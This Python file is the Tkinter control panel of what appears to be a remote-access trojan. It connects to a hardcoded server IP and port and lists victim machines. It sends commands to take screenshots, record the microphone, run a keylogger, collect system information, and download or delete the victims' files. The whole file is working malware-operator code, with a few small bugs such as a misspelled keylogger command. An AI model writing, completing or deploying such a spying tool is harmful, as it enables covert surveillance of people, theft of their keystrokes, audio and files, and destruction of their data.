import hashlib
from tkinter import *
from tkinter import messagebox
from PIL import Image, ImageTk
from functools import partial
from pathlib import Path

import os
from os.path import join
import socket


class MySocket:
    def __init__(self):
        PORT = 5055
        SERVER = '5.29.17.38'
        ADDR = (SERVER, PORT)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(ADDR)

    def send_request(self, request):
        if request == "folders":
            self.request_folder_names()
        elif "files" in request:
            self.request_files(request[5:])
        elif "delete" in request:
            self.request_delete(request)
        elif "download" in request:
            self.request_download(request)
        else:      # screenshot / audio / keylogger / pc info
            msg = request.encode()
            msg += b' ' * (2048 - len(msg))
            self.sock.send(msg)

    def request_download(self, request):
        msg = request.encode()
        msg += b' ' * (2048 - len(msg))
        self.sock.send(msg)

    def request_delete(self, request):
        msg = request.encode()
        msg += b' ' * (2048 - len(msg))
        self.sock.send(msg)

    def request_files(self, folder_name):
        msg = ("getfiles" + folder_name).encode()
        msg += b' ' * (2048 - len(msg))
        self.sock.send(msg)

    def request_folder_names(self):
        msg = "getfolders".encode()
        msg += b' ' * (2048 - len(msg))
        self.sock.send(msg)

    def handle_messages(self, length=2048, decode_msg=True):
        msg = self.sock.recv(length)
        return msg.decode() if decode_msg else msg

    def __del__(self):
        # Runs when object destroyed
        print('Closing socket')
        self.sock.close()

sock = MySocket()


def delete(path):
    sock.send_request(request='delete' + path)

def download(path):
    print(1)
    sock.send_request(request="download" + path)
    downloads_path = str(Path.home() / "Downloads")
    print("requested")
    file_name = sock.handle_messages().replace(" ", "")
    print(file_name)
    msg_length = int(sock.handle_messages().replace(" ", ""))
    print(msg_length)
    data = sock.handle_messages(msg_length, decode_msg=False)

    with open(downloads_path + "\\" + file_name, "wb") as file:
        file.write(data)

def request_screenshot(folder_name):
    print('GUI requsted from', folder_name, ' -> ', 'screenshot')
    sock.send_request(request="screenshot" + folder_name)

def request_pcinfo(folder_name):
    sock.send_request(request="pcinfo" + folder_name)

def request_audio(folder_name, mic_time_entry):
    time = mic_time_entry.get()
    if time:
        if time.isdigit():
            sock.send_request(request="audio" + str(time) + folder_name)
        else:
            messagebox.showerror(title="ERROR", message="Write in the entry only numbers")
    else:
        messagebox.showerror(title="ERROR", message="Please set the recording length")

def change_keylogger_impolse(folder_name, new_impolse):
    time = new_impolse.get()
    if time:
        if time.isdigit():
            sock.send_request(request="kelogger" + str(new_impolse) + folder_name)
        else:
            messagebox.showerror(title="ERROR", message="Write in the entry only numbers")
    else:
        messagebox.showerror(title="ERROR", message="Please set the impolse time")
screen = None

def open_folder(folder_name):
    global screen
    sock.send_request(request='files' + folder_name)
    print(1)
    files = sock.handle_messages()
    print(files)
    files = files.replace(" ", "").split("---")
    files.remove('') if '' in files else None
    print(2)
    screen = Toplevel()
    screen.title(folder_name)
    screen.geometry('600x600+300+200')
    screen.resizable(False, False)
    screen.configure(bg="#F4E9DD")
    frame = Frame(screen, bg="white")
    frame.place(relwidth=0.694, relheight=0.8, relx=0.15, rely=0.02)

    delete_icon = Image.open("delete.png")
    delete_icon.thumbnail((23, 23))
    delete_icon = ImageTk.PhotoImage(delete_icon)

    download_icon = Image.open("download.png")
    download_icon.thumbnail((23, 23))
    download_icon = ImageTk.PhotoImage(download_icon)

    if len(files) > 0:
        for i in range(len(files)):
            # The partial function enables to functions with args to be used in button.command
            folder_label = Label(frame, text=files[i], bg="grey", width=51, height=1, borderwidth=3,
                                 relief="ridge")
            folder_label.grid(row=i, column=0)

            special_function = partial(delete, folder_name + "\\" + files[i])
            delete_folder_button = Button(frame, image=delete_icon, border=0, command=special_function)
            delete_folder_button.grid(row=i, column=1)

            special_function = partial(download, folder_name + "\\" + files[i])
            download_folder_button = Button(frame, image=download_icon, border=0, command=special_function)
            download_folder_button.grid(row=i, column=2)

    if "disconnected" in folder_name:
        pass
    else:
        # SCREEN-SHOT BUTTON
        special_function_screen_shot = partial(request_screenshot, folder_name)
        screenshot_button = Button(screen, text="Screen-Shot", bg="#9f81f0", width=10,command=special_function_screen_shot)
        screenshot_button.place(x=130, y=500)

        # PC-INFO BUTTON
        special_function_pc_info = partial(request_pcinfo, folder_name)
        pcInfo_button = Button(screen, text="PC-info", bg="#9f81f0", width=10, command=special_function_pc_info)
        pcInfo_button.place(x=130, y=540)

        # MIC-RECORDER BUTTON

        mic_time_entry = Entry(screen, width=7, border=0.5)
        mic_time_entry.place(x=430, y=502)
        special_function_microphone = partial(request_audio, folder_name, mic_time_entry)
        microphone_button = Button(screen, text="Mic-record", bg="#9f81f0", width=10,
                                   command=special_function_microphone)
        microphone_button.place(x=350, y=500)

        # KEYLOGGER BUTTON
        keylogger_impulse = Entry(screen, width=7, border=0.5)
        keylogger_impulse.place(x=430, y=542)
        special_function_keylogger = partial(change_keylogger_impolse, folder_name, keylogger_impulse)
        keylogger_button = Button(screen, text="key-logger", bg="#9f81f0", width=10, command=special_function_keylogger)
        keylogger_button.place(x=350, y=540)

        refresh_icon = Image.open("refresh.png")
        refresh_icon.thumbnail((50, 50))
        refresh_icon = ImageTk.PhotoImage(refresh_icon)
        special_function = partial(refresh ,"", folder_name)
        refresh_button = Button(screen, image=refresh_icon, border=0.5, command=special_function)
        refresh_button.place(x=10, y=10)

    screen.mainloop()



def refresh(type, folder_name=None):
    global root
    if type == "main":
        root.destroy()

        root = Tk()
        sock.send_request('folders')
        folders = sock.handle_messages()
        print(folders)
        folders = folders.replace(" ", "").split("---")

        root.title('Data')
        root.geometry('600x500+300+200')
        root.configure(bg="#F4E9DD")
        root.resizable(False, False)
        frame = Frame(root, bg="white")
        frame.place(relwidth=0.694, relheight=0.8, relx=0.15, rely=0.1)

        refresh_icon = Image.open("refresh.png")
        refresh_icon.thumbnail((50, 50))
        refresh_icon = ImageTk.PhotoImage(refresh_icon)
        special_function = partial(refresh, "main")
        refresh_button = Button(screen, image=refresh_icon, border=0.5, command=special_function)
        refresh_button.place(x=10, y=10)

        delete_icon = Image.open("delete.png")
        delete_icon.thumbnail((23, 23))
        delete_icon = ImageTk.PhotoImage(delete_icon)
        special_function = partial(refresh, "main")
        download_icon = Image.open("download.png")
        download_icon.thumbnail((23, 23))
        download_icon = ImageTk.PhotoImage(download_icon)

        for i in range(len(folders)):
            # The partial function enables to functions with args to be used in button.command
            special_function = partial(open_folder, folders[i])
            folder_button = Button(frame, text=folders[i], bg="grey", width=51, height=1, border=0.5,
                                   command=special_function)
            folder_button.grid(row=i, column=0)

            # The partial function enables to functions with args to be used in button.command

            special_function = partial(delete, folders[i])
            delete_folder_button = Button(frame, image=delete_icon, border=0, command=special_function)
            delete_folder_button.grid(row=i, column=1)

            special_function = partial(download, folders[i])
            download_folder_button = Button(frame, image=download_icon, border=0, command=special_function)
            download_folder_button.grid(row=i, column=2)

        root.mainloop()


    else:
        screen.destroy()
        open_folder(folder_name)


root = Tk()
sock.send_request('folders')
folders = sock.handle_messages()
print(folders)
folders = folders.replace(" ", "").split("---")

root.title('Data')
root.geometry('600x500+300+200')
root.configure(bg="#F4E9DD")
root.resizable(False, False)
frame = Frame(root, bg="white")
frame.place(relwidth=0.694, relheight=0.8, relx=0.15, rely=0.1)

refresh_icon = Image.open("refresh.png")
refresh_icon.thumbnail((50, 50))
refresh_icon = ImageTk.PhotoImage(refresh_icon)

special_function = partial(refresh, "main")
refresh_button = Button(root, image=refresh_icon, border=0.5, command=special_function)
refresh_button.place(x=10, y=10)

delete_icon = Image.open("delete.png")
delete_icon.thumbnail((23, 23))
delete_icon = ImageTk.PhotoImage(delete_icon)

download_icon = Image.open("download.png")
download_icon.thumbnail((23, 23))
download_icon = ImageTk.PhotoImage(download_icon)

for i in range(len(folders)):
    # The partial function enables to functions with args to be used in button.command
    special_function = partial(open_folder, folders[i])
    folder_button = Button(frame, text=folders[i], bg="grey", width=51, height=1, border=0.5, command=special_function)
    folder_button.grid(row=i, column=0)

    # The partial function enables to functions with args to be used in button.command

    special_function = partial(delete, folders[i])
    delete_folder_button = Button(frame, image=delete_icon, border=0, command=special_function)
    delete_folder_button.grid(row=i, column=1)

    special_function = partial(download, folders[i])
    download_folder_button = Button(frame, image=download_icon, border=0, command=special_function)
    download_folder_button.grid(row=i, column=2)

root.mainloop()

